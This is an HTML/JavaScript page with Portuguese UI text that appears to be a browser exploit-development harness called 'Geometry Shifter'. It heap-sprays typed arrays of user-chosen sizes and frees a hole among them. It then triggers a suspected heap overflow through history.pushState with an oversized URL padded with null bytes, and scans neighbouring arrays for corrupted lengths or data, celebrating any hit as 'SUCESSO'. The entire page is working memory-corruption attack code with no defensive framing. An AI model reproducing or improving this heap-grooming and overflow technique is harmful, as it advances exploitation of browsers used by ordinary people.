<!DOCTYPE html>
<html>
<head>
    <title>Geometry Shifter: Layout Manipulation</title>
    <style>
        body { background: #1a001a; color: #ff99ff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #505; height: 350px; overflow-y: scroll; padding: 10px; background: #101; color: #fff; margin-bottom: 15px;}
        button { 
            padding: 12px; width: 100%; font-size: 16px; font-weight: bold; 
            margin-bottom: 8px; cursor: pointer; border: 1px solid #a0a; 
            background: #303; color: #fff; 
        }
        button:hover { background: #d0d; color: #000; }
        .success { background: #0f0; color: #000; padding: 10px; font-size: 20px; text-align: center; }
    </style>
</head>
<body>
    <h1>GEOMETRY SHIFTER</h1>
    <p>Base: 709518 | Overflow Fixo: ZEROS (Seguro)</p>
    <p>Estratégia: Mudar o tamanho do vizinho para alinhar o Header com o Overflow.</p>

    <div id="logger" class="log">Escolha um novo tamanho de objeto...</div>

    <button onclick="runShift(128)">1. Tamanho Minúsculo (128 itens = 512 bytes)</button>
    <button onclick="runShift(256)">2. Tamanho Pequeno (256 itens = 1024 bytes)</button>
    <button onclick="runShift(512)">3. Tamanho Médio (512 itens = 2048 bytes)</button>
    <button onclick="runShift(768)">4. Tamanho Quebrado (768 itens = 3072 bytes)</button>
    <button onclick="runShift(1000)">5. Tamanho "Quase" (1000 itens = 4000 bytes)</button>
    <button onclick="runShift(1024)">6. Padrão (1024 itens - Controle)</button>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const HOLE_SIZE = 168;    
        const SPRAY_SIZE = 5000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runShift(arrSize) {
            log("---------------------------------------");
            log(`TESTANDO GEOMETRIA: Uint32Array(${arrSize})`);
            log(`Tamanho em Bytes: ${arrSize * 4} bytes + Header`);

            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 300));
            spray = [];

            // 1. Spray com o NOVO TAMANHO
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(arrSize);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                // Preencher o final para garantir que não estamos lendo lixo
                arr[arrSize-1] = 0xDEADBEEF;
                spray.push(arr);
            }

            // 2. Buraco (Mantemos o mesmo tamanho de buraco por enquanto)
            let center = 2500;
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // Base
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Overflow: Vamos usar 64 bytes de ZEROS.
                // Isso deve ser seguro (não crasha) mas letal para estruturas.
                let overflow = new Array(65).join("\x00");
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + arrSize + "_" + Date.now(), payload);
                
                checkCorruption(HOLE_SIZE, center, arrSize);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx, expectedSize) {
            let found = false;
            let limit = startIdx + holeUsed + 60;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // Verificação Robusta de Anomalia
                    let len = -1;
                    let val0 = -1;
                    
                    try { len = arr.length; } catch(e) { len = "ERRO"; }
                    try { val0 = arr[0]; } catch(e) { val0 = "ERRO"; }

                    // 1. Mudança de Tamanho
                    if(len !== expectedSize && len !== "ERRO") {
                        found = true;
                        reportSuccess(i, "LENGTH CHANGE", `De ${expectedSize} para ${len}`);
                        return;
                    }

                    // 2. Erro ao ler (Objeto Morto)
                    if(len === "ERRO" || val0 === "ERRO") {
                        found = true;
                        reportSuccess(i, "OBJECT DEAD", "O array está inacessível (Crash evitado?)");
                        return;
                    }
                    
                    // 3. Tamanho Zero ou Gigante (Undefined as vezes vira 0)
                    if(len === 0 || len > 1000000) {
                        found = true;
                        reportSuccess(i, "LENGTH CORRUPTION", `Length virou ${len}`);
                        return;
                    }

                    // 4. Mudança de Dados
                    if(val0 !== MAGIC_NUM) {
                        found = true;
                        reportSuccess(i, "DATA CORRUPTION", `Valor lido: ${val0}`);
                        return;
                    }
                }
            }
            if(!found) log(`Tamanho ${expectedSize}: Nenhuma anomalia detectada.`);
        }

        function reportSuccess(idx, type, msg) {
            document.body.innerHTML = `<div class='success'><h1>SUCESSO!</h1><h2>${type}</h2><p>${msg}</p><p>Index: ${idx}</p></div>`;
            alert(`BINGO!\n${type}\n${msg}`);
        }
    </script>
</body>
</html>
